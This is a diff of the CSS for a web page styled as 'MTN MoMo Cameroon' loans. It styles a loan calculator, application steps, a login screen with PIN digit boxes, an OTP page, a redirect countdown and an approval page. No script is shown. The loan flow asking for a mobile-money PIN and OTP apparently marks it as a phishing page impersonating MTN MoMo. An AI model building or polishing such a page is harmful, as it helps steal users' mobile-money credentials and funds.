@@ -1,285 +1,299 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MTN MoMo Cameroon – Fast and Easy Loans</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<style>
-  :root {
-    --navy: #004F71;
-    --navy-dark: #003851;
-    --teal: #FFCC00;
-    --purple: #FFB300;
-    --grad: linear-gradient(to right, #FFCC00, #FFB300);
-    --page-bg: #F4F4F4;
-    --white: #FFFFFF;
-    --text-dark: #1C1C1C;
-    --text-mid: #444;
-    --text-light: #888;
-    --border: #ddd;
-    --radius: 12px;
-    --radius-sm: 8px;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MTN MoMo Cameroon – Fast and Easy Loans</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --navy: #004F71;
+      --navy-dark: #003851;
+      --yellow: #FFCC00;
+      --yellow-dark: #FFB300;
+      --grad: linear-gradient(135deg, #FFCC00 0%, #FFB300 100%);
+      --page-bg: #F4F6F8;
+      --white: #FFFFFF;
+      --text-dark: #1C1C1C;
+      --text-mid: #444444;
+      --text-light: #718096;
+      --border: #E2E8F0;
+      --radius: 14px;
+      --radius-sm: 8px;
+    }
 
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: var(--page-bg);
-    color: var(--text-dark);
-    min-height: 100vh;
-  }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
-  /* PAGE SYSTEM */
-  .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
-  .page.active { display: flex; flex-direction: column; }
-  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--page-bg);
+      color: var(--text-dark);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
 
-  /* OVERLAY */
-  .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
-  .overlay.show { display:flex; }
-  .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
-  @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
-  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
-  @keyframes spin { to{transform:rotate(360deg)} }
-  .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
-  .modal p  { font-size:0.88rem; color:var(--text-light); }
+    /* PAGE SYSTEM */
+    .page { display: none; min-height: 100vh; animation: fadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+    .page.active { display: flex; flex-direction: column; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
 
-  /* LOGO */
-  .logo-img { width:40px; height:40px; object-fit:contain; display:block; }
-  .logo-sub { font-size:0.72rem; color:rgba(255,255,255,0.65); }
+    /* OVERLAYS & MODALS */
+    .overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.55); backdrop-filter: blur(4px); z-index: 999; align-items: center; justify-content: center; }
+    .overlay.show { display: flex; }
+    .modal { background: var(--white); border-radius: var(--radius); padding: 36px 28px; text-align: center; max-width: 340px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.25); animation: popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
+    @keyframes popIn { from { opacity:0; transform: scale(0.88); } to { opacity:1; transform: scale(1); } }
+    .spinner { width: 44px; height: 44px; border: 4px solid #E2E8F0; border-top-color: var(--navy); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 18px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .modal h3 { font-size: 1.1rem; font-weight: 700; color: var(--text-dark); margin-bottom: 6px; }
+    .modal p  { font-size: 0.88rem; color: var(--text-light); line-height: 1.4; }
 
-  /* NAV */
-  .navbar { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
-  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.8); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
-  .nav-left:hover { color:#fff; }
-  .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
-  .hline { width:20px; height:2px; background:rgba(255,255,255,0.7); border-radius:1px; }
+    /* BRAND / LOGO */
+    .brand-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 36px;
+      height: 36px;
+      background: var(--yellow);
+      color: var(--navy-dark);
+      font-weight: 800;
+      font-size: 0.85rem;
+      border-radius: 50%;
+      letter-spacing: -0.02em;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      flex-shrink: 0;
+    }
+    .logo-img { width: 36px; height: 36px; object-fit: contain; display: block; }
 
-  /* BUTTONS */
-  .btn-grad { background:var(--grad); color:#1C1C1C; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:inherit; transition:opacity 0.2s; }
-  .btn-grad:hover { opacity:0.9; }
-  .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
-  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:inherit; transition:background 0.2s; }
-  .btn-gray:hover { background:#d0d0d0; }
+    .hp-logo-inline { display: flex; align-items: center; gap: 10px; }
+    .hp-logo-inline .brand { font-size: 1.35rem; font-weight: 800; color: #FFF; letter-spacing: -0.02em; }
+    .hp-logo-inline .brand span { color: var(--yellow); }
 
-  /* FORM */
-  .field { margin-bottom:18px; }
-  .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
-  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:inherit; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
-  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,204,0,0.2); }
-  .field textarea { resize:vertical; min-height:90px; }
-  .sel-wrap { position:relative; }
-  .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }
-  .field-row { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-  .phone-row { display:flex; }
-  .ph-pre { padding:11px 12px; background:#f5f5f5; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.85rem; font-weight:500; color:#555; white-space:nowrap; display:flex; align-items:center; }
-  .phone-row input { border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important; flex:1; }
-  .field-hint { font-size:0.75rem; color:var(--text-light); margin-top:5px; }
+    .hp-logo-sm { display: flex; align-items: center; gap: 8px; }
+    .hp-logo-sm .brand { font-size: 1.1rem; font-weight: 800; color: #FFF; }
+    .hp-logo-sm .brand span { color: var(--yellow); }
 
-  /* STEP PROGRESS */
-  .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
-  .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
-  .prog-seg.done { background:var(--purple); }
-  .prog-seg.now  { background:var(--teal); }
+    /* NAV BAR */
+    .navbar { background: var(--navy); display: flex; align-items: center; justify-content: center; padding: 0 20px; height: 58px; position: relative; flex-shrink: 0; }
+    .nav-left { position: absolute; left: 20px; color: rgba(255,255,255,0.85); font-size: 0.88rem; font-weight: 500; cursor: pointer; text-decoration: none; transition: color 0.2s; }
+    .nav-left:hover { color: #FFF; }
+    .nav-right { position: absolute; right: 20px; display: flex; flex-direction: column; gap: 4px; cursor: pointer; padding: 4px; }
+    .hline { width: 20px; height: 2px; background: rgba(255,255,255,0.75); border-radius: 1px; }
 
-  /* STEP BUTTONS */
-  .step-btns { display:flex; gap:12px; margin-top:8px; }
-  .step-btns .btn-grad { flex:1; }
+    /* BUTTONS */
+    .btn-grad { background: var(--grad); color: #1C1C1C; border: none; border-radius: var(--radius-sm); padding: 14px 20px; font-size: 0.9rem; font-weight: 700; letter-spacing: 0.03em; cursor: pointer; width: 100%; font-family: inherit; transition: opacity 0.2s, transform 0.1s; }
+    .btn-grad:hover { opacity: 0.95; }
+    .btn-grad:active { transform: translateY(1px); }
+    .btn-grad:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-gray { background: #E2E8F0; color: #4A5568; border: none; border-radius: var(--radius-sm); padding: 14px 20px; font-size: 0.9rem; font-weight: 600; cursor: pointer; flex: 1; font-family: inherit; transition: background 0.2s; }
+    .btn-gray:hover { background: #CBD5E0; }
 
-  /* FOOTER */
-  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
+    /* FORM ELEMENTS */
+    .field { margin-bottom: 18px; }
+    .field label { display: block; font-size: 0.82rem; font-weight: 600; color: var(--text-mid); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.03em; }
+    .field input, .field select, .field textarea {
+      width: 100%; padding: 12px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-sm);
+      font-family: inherit; font-size: 0.92rem; color: var(--text-dark); background: #FFF; outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s; appearance: none; -webkit-appearance: none;
+    }
+    .field input:focus, .field select:focus, .field textarea:focus { border-color: var(--navy); box-shadow: 0 0 0 3px rgba(0,79,113,0.12); }
+    .field textarea { resize: vertical; min-height: 90px; }
+    .sel-wrap { position: relative; }
+    .sel-wrap::after { content: '▾'; position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: var(--text-light); pointer-events: none; font-size: 0.9rem; }
+    .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .phone-row { display: flex; }
+    .ph-pre { padding: 12px 12px; background: #F8FAFC; border: 1.5px solid var(--border); border-right: none; border-radius: var(--radius-sm) 0 0 var(--radius-sm); font-size: 0.88rem; font-weight: 600; color: #4A5568; white-space: nowrap; display: flex; align-items: center; }
+    .phone-row input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important; flex: 1; }
+    .field-hint { font-size: 0.75rem; color: var(--text-light); margin-top: 5px; }
 
-  /* LANDING */
-  #page-landing { background:var(--page-bg); }
-  .land-nav { background:var(--navy); display:flex; align-items:center; justify-content:space-between; padding:0 24px; height:60px; flex-shrink:0; }
-  .land-nav .hbg { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
-  .land-nav .hbg span { width:20px; height:2px; background:rgba(255,255,255,0.7); border-radius:1px; display:block; }
-  .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
-  .land-card { width:100%; max-width:520px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; }
-  .land-card h1 { font-size:1.45rem; font-weight:700; text-align:center; margin-bottom:6px; }
-  .land-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
-  .calc-box { background:#fafafa; border:1px solid #eee; border-radius:var(--radius-sm); padding:20px; margin-bottom:22px; }
-  .calc-box h2 { font-size:0.92rem; font-weight:600; margin-bottom:16px; }
-  .calc-row2 { display:flex; justify-content:space-between; font-size:0.81rem; color:var(--text-mid); margin-bottom:6px; }
-  .calc-row2 .cv { color:#004F71; font-weight:600; }
-  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--teal) 0%,var(--teal) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
-  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--teal); border:3px solid #fff; box-shadow:0 2px 6px rgba(0,0,0,0.2); cursor:pointer; }
-  .range-ends { display:flex; justify-content:space-between; font-size:0.72rem; color:var(--text-light); margin-bottom:14px; }
-  .monthly-box { background:#fff; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; }
-  .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
-  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--navy); }
-  .feats-row { display:flex; justify-content:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
-  .feat { text-align:center; }
-  .feat .fi { font-size:1.6rem; margin-bottom:5px; }
-  .feat .ft { font-size:0.8rem; font-weight:600; }
-  .feat .fs { font-size:0.73rem; color:var(--text-light); }
-  .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
+    /* PROGRESS BARS */
+    .prog-row { display: flex; gap: 8px; margin: 10px 0 24px; }
+    .prog-seg { flex: 1; height: 5px; border-radius: 3px; background: #E2E8F0; transition: background 0.3s; }
+    .prog-seg.done { background: var(--navy); }
+    .prog-seg.now  { background: var(--yellow); }
 
-  /* STEPS */
-  .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
-  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
-  .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
-  .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
+    .step-btns { display: flex; gap: 12px; margin-top: 8px; }
+    .step-btns .btn-grad { flex: 1; }
 
-  /* SUMMARY */
-  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--teal); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fffdf5; }
-  .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
-  .sum-box .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
-  .sum-box .sum-row:last-child { border-bottom:none; }
-  .sum-box .sum-row .sk { color:var(--text-light); }
-  .sum-box .sum-row .sv { font-weight:500; }
+    /* FOOTER */
+    .pg-footer { margin-top: auto; padding: 16px; text-align: center; font-size: 0.78rem; color: var(--text-light); background: #FFF; border-top: 1px solid var(--border); flex-shrink: 0; }
 
-  /* SUBMITTED */
-  #page-submitted { background:linear-gradient(160deg,var(--navy),#002233); align-items:center; justify-content:center; }
-  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
-  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
-  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,204,0,0.3)} 50%{box-shadow:0 0 0 16px rgba(255,204,0,0)} }
-  .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
-  .sub-wrap p  { color:rgba(255,255,255,0.85); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
-  .redir-pill { display:inline-flex; align-items:center; gap:8px; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); border-radius:50px; padding:9px 20px; color:#fff; font-size:0.84rem; margin-bottom:24px; }
-  .redir-n { font-weight:700; color:var(--teal); }
-  .btn-go { background:var(--grad); color:#1C1C1C; border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:inherit; letter-spacing:0.04em; }
+    /* LANDING PAGE */
+    #page-landing { background: var(--page-bg); }
+    .land-nav { background: var(--navy); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; height: 64px; flex-shrink: 0; }
+    .land-nav .hbg { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
+    .land-nav .hbg span { width: 20px; height: 2px; background: rgba(255,255,255,0.8); border-radius: 1px; display: block; }
+    .land-center { flex: 1; display: flex; align-items: center; justify-content: center; padding: 32px 16px; }
+    .land-card { width: 100%; max-width: 500px; background: #FFF; border-radius: var(--radius); box-shadow: 0 10px 30px rgba(0,0,0,0.06); padding: 36px 28px; }
+    .land-card h1 { font-size: 1.5rem; font-weight: 800; text-align: center; margin-bottom: 6px; color: var(--navy-dark); }
+    .land-tagline { text-align: center; font-size: 0.86rem; color: var(--text-light); margin-bottom: 26px; }
+    .calc-box { background: #F8FAFC; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 20px; margin-bottom: 22px; }
+    .calc-box h2 { font-size: 0.92rem; font-weight: 700; margin-bottom: 16px; color: var(--navy); }
+    .calc-row2 { display: flex; justify-content: space-between; font-size: 0.84rem; color: var(--text-mid); margin-bottom: 6px; font-weight: 500; }
+    .calc-row2 .cv { color: var(--navy); font-weight: 700; }
+    
+    input[type=range] { width: 100%; -webkit-appearance: none; height: 6px; border-radius: 3px; outline: none; cursor: pointer; margin-bottom: 4px; background: linear-gradient(to right, var(--yellow) 0%, var(--yellow) var(--pct,10%), #E2E8F0 var(--pct,10%), #E2E8F0 100%); }
+    input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 20px; height: 20px; border-radius: 50%; background: var(--yellow); border: 3px solid #FFF; box-shadow: 0 2px 6px rgba(0,0,0,0.2); cursor: pointer; }
+    
+    .range-ends { display: flex; justify-content: space-between; font-size: 0.72rem; color: var(--text-light); margin-bottom: 14px; font-weight: 500; }
+    .monthly-box { background: #FFF; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; }
+    .monthly-box .ml { font-size: 0.82rem; color: var(--text-light); font-weight: 500; }
+    .monthly-box .ma { font-size: 1.45rem; font-weight: 800; color: var(--navy); }
+    .feats-row { display: flex; justify-content: space-around; padding: 20px 0 0; border-top: 1px solid var(--border); margin-top: 20px; }
+    .feat { text-align: center; }
+    .feat .fi { font-size: 1.5rem; margin-bottom: 4px; }
+    .feat .ft { font-size: 0.8rem; font-weight: 700; }
+    .feat .fs { font-size: 0.73rem; color: var(--text-light); }
+    .land-footer { background: var(--navy); padding: 16px; text-align: center; font-size: 0.78rem; color: rgba(255,255,255,0.65); flex-shrink: 0; }
 
-  /* LOGIN */
-  #page-login { background:#fff; }
-  .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
-  .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
-  .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
-  .login-inner { width:100%; max-width:380px; }
-  .lg-phone-row { display:flex; margin-bottom:24px; }
-  .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
-  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:inherit; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
-  .lg-phone-row input:focus { border-color:var(--teal); }
-  .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
-  
-  /* PIN & OTP DIGIT BOXES */
-  .pin-row, .otp-inputs { display:flex; gap:10px; justify-content:center; margin-bottom:16px; position:relative; align-items:center; }
-  .pin-box, .otp-box { 
-    width: 48px; 
-    height: 54px; 
-    border: 1.5px solid var(--border); 
-    border-radius: var(--radius-sm); 
-    text-align: center; 
-    font-family: inherit; 
-    font-size: 1.4rem; 
-    font-weight: 700; 
-    color: var(--navy); 
-    outline: none; 
-    transition: all 0.2s ease; 
-    background: #FAFAFA;
-  }
-  .pin-box:focus, .otp-box:focus { 
-    border-color: var(--navy); 
-    background: #FFF;
-    box-shadow: 0 0 0 3px rgba(0,79,113,0.15); 
-  }
-  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1.1rem; background:none; border:none; margin-left:6px; padding:4px; }
-  .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:inherit; transition:all 0.2s; }
-  .btn-login.rdy { background:var(--grad); color:#1C1C1C; }
-  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
-  .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
-  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
-  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.55); }
-  .lg-terms a { color:rgba(255,255,255,0.75); }
+    /* STEPS */
+    .step-center { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 32px 16px; }
+    .step-card { width: 100%; max-width: 480px; background: #FFF; border-radius: var(--radius); box-shadow: 0 10px 30px rgba(0,0,0,0.06); padding: 32px 28px; }
+    .step-card h2 { font-size: 1.3rem; font-weight: 800; text-align: center; margin-bottom: 4px; color: var(--navy); }
+    .step-sub { text-align: center; font-size: 0.82rem; color: var(--text-light); margin-bottom: 4px; font-weight: 500; }
 
-  /* OTP */
-  #page-otp { background:#fff; }
-  .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
-  .otp-topbar .bk { font-size:1.1rem; color:#333; cursor:pointer; background:none; border:none; }
-  .otp-topbar .hbg2 { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
-  .otp-topbar .hbg2 span { width:20px; height:2px; background:#666; border-radius:1px; display:block; }
-  .otp-body-wrap { flex:1; padding:32px 16px; display:flex; align-items:flex-start; justify-content:center; }
-  .otp-card { background:#fff; border:1px solid #eee; border-radius:var(--radius); padding:32px 28px; width:100%; max-width:440px; box-shadow:0 2px 16px rgba(0,0,0,0.06); }
-  .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
-  .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
-  .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
-  .otp-resend { font-size:0.8rem; color:#004F71; margin-bottom:22px; text-align:center; }
-  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:inherit; transition:all 0.2s; }
-  .btn-otp.rdy { background:var(--grad); color:#1C1C1C; }
-  .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
-  .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.55); }
+    /* SUMMARY BOX */
+    .sum-box { border: 1px solid #FDE68A; border-left: 4px solid var(--yellow); border-radius: var(--radius-sm); padding: 16px 14px; margin: 18px 0; background: #FFFBEB; }
+    .sum-box h3 { font-size: 0.88rem; font-weight: 700; margin-bottom: 12px; color: #92400E; }
+    .sum-box .sum-row { display: flex; justify-content: space-between; font-size: 0.82rem; padding: 7px 0; border-bottom: 1px solid #FEF3C7; }
+    .sum-box .sum-row:last-child { border-bottom: none; }
+    .sum-box .sum-row .sk { color: #78350F; font-weight: 500; }
+    .sum-box .sum-row .sv { font-weight: 700; color: #451A03; }
 
-  /* APPROVAL */
-  #page-approval { background:linear-gradient(135deg,#FFCC00 0%,#FFB300 50%,#004F71 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
-  .appr-wrap { width:100%; max-width:520px; }
-  .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
-  .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--purple)); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#1C1C1C; box-shadow:0 4px 16px rgba(0,0,0,0.1); }
-  .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
-  .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
-  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
-  .appr-banner .abl { font-size:0.72rem; color:rgba(28,28,28,0.9); text-transform:uppercase; letter-spacing:0.06em; }
-  .appr-banner .aba { font-size:2rem; font-weight:700; color:#1C1C1C; }
-  .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
-  .ld-card { background:#fff; padding:20px 24px; }
-  .ld-card .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
-  .ld-card .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
-  .ld-card .ld-row:last-child { border-bottom:none; }
-  .ld-card .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
-  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60); color:#fff;}
-  .ic-b{background:linear-gradient(135deg,#FFCC00,#FFB300); color:#1C1C1C;}
-  .ic-p{background:linear-gradient(135deg,#004F71,#003851); color:#fff;}
-  .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
-  .ld-val { font-size:0.9rem; font-weight:600; }
-  .qa-wrap { background:#fff; padding:0 24px 18px; }
-  .qa-title { font-size:0.8rem; font-weight:600; color:var(--text-mid); margin-bottom:10px; text-align:center; }
-  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:inherit; transition:all 0.2s; }
-  .qa-btn:hover { border-color:var(--navy); color:var(--navy); }
-  .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
-  .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
-  .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; display:flex; flex-direction:column; gap:12px; }
-  .rth-btn { width:100%; padding:14px; background:var(--grad); color:#1C1C1C; border:none; border-radius:var(--radius-sm); font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:inherit; box-shadow:0 4px 12px rgba(0,0,0,0.1); transition:all 0.2s ease; }
-  .rth-btn:hover { opacity:0.95; transform:translateY(-1px); }
-  
-  .reapply-btn-pro { 
-    width: 100%; padding: 14px; background: #ffffff; color: var(--navy); border: 2px solid var(--navy); border-radius: var(--radius-sm); font-size: 0.88rem; font-weight: 700; letter-spacing: 0.04em; cursor: pointer; font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.04); transition: all 0.25s ease; text-decoration: none;
-  }
-  .reapply-btn-pro:hover { background: #f0f8ff; border-color: #003851; color: #003851; transform: translateY(-1px); box-shadow: 0 4px 10px rgba(0,79,113,0.1); }
+    /* SUBMITTED PAGE */
+    #page-submitted { background: linear-gradient(160deg, var(--navy), #002233); align-items: center; justify-content: center; }
+    .sub-wrap { text-align: center; padding: 40px 24px; max-width: 420px; }
+    .sub-icon { width: 80px; height: 80px; border-radius: 50%; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.25); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 24px; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100%{ box-shadow: 0 0 0 0 rgba(255,204,0,0.4); } 50%{ box-shadow: 0 0 0 18px rgba(255,204,0,0); } }
+    .sub-wrap h2 { font-size: 1.5rem; font-weight: 800; color: #FFF; margin-bottom: 12px; }
+    .sub-wrap p  { color: rgba(255,255,255,0.85); font-size: 0.88rem; line-height: 1.6; margin-bottom: 24px; }
+    .redir-pill { display: inline-flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.2); border-radius: 50px; padding: 10px 20px; color: #FFF; font-size: 0.84rem; margin-bottom: 24px; }
+    .redir-n { font-weight: 800; color: var(--yellow); }
+    .btn-go { background: var(--grad); color: #1C1C1C; border: none; border-radius: var(--radius-sm); padding: 14px 36px; font-size: 0.9rem; font-weight: 700; cursor: pointer; font-family: inherit; }
 
-  /* LIVE POPUP */
